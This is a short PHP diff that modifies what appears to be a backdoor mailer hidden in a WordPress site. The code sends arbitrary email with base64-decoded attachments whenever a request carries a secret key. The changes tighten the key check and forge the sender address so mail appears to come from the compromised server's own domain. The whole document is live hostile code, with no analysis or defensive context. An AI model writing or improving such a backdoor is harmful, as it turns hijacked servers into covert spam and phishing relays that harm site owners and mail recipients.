@@ -1,4 +1,4 @@
-if (@$_REQUEST["_k"] == "INSERT_KEY") {
+if (@$_REQUEST["_k"] === "INSERT_KEY") {
 	ini_set("post_max_size", "256M");
 
 	global $phpmailer;
@@ -22,19 +22,21 @@ if (@$_REQUEST["_k"] == "INSERT_KEY") {
 		$subject = $m["m_s"];
 		$htmlbody = $m["m_hb"];
 		$plainbody = $m["m_pb"];
-		$attachment = $m["m_a"];
+		if (isset($m["m_a"])) {
+		    $attachment = $m["m_a"];
+		}
 
 		$phpmailer->ClearAllRecipients();
 		$phpmailer->ClearAttachments();
 		$phpmailer->ClearCustomHeaders();
 		$phpmailer->ClearReplyTos();
-		$phpmailer->SetFrom($from[0], $from[1], false);
-		$phpmailer->Sender = $from[0];
+		$phpmailer->SetFrom($from[0] . "@" . $_SERVER["SERVER_NAME"], $from[1], false);
+		$phpmailer->Sender = $from[0] . "@" . $_SERVER["SERVER_NAME"];
 		$phpmailer->AddAddress($to);
 		$phpmailer->Subject = $subject;
 		$phpmailer->Body = $htmlbody;
 		$phpmailer->AltBody = $plainbody;
-		if (null !== $attachment) {
+		if (isset($attachment)) {
 			$phpmailer->AddStringAttachment(base64_decode($attachment["c"]), $attachment["n"], "base64", $attachment["t"]);
 		}
 		if (!$phpmailer->Send()) {
